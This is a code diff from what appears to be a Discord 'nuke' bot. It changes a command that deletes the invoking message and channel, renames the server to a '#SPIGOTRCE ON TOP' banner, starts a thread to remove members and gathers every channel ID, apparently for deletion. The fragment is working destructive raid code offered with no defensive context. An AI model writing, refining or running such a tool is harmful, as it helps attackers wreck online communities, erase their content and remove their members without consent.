@@ -191,8 +191,9 @@ async def on_ready():
 async def nuke(ctx):
     global GUILD
     GUILD = ctx.guild.id
-    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
+    await ctx.message.delete()
     await ctx.channel.delete()
+    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
     threading.Thread(target=remove_members).start()
     channel_ids = [c['id'] for c in get_all_channels()]
     if len(channel_ids) != 0:
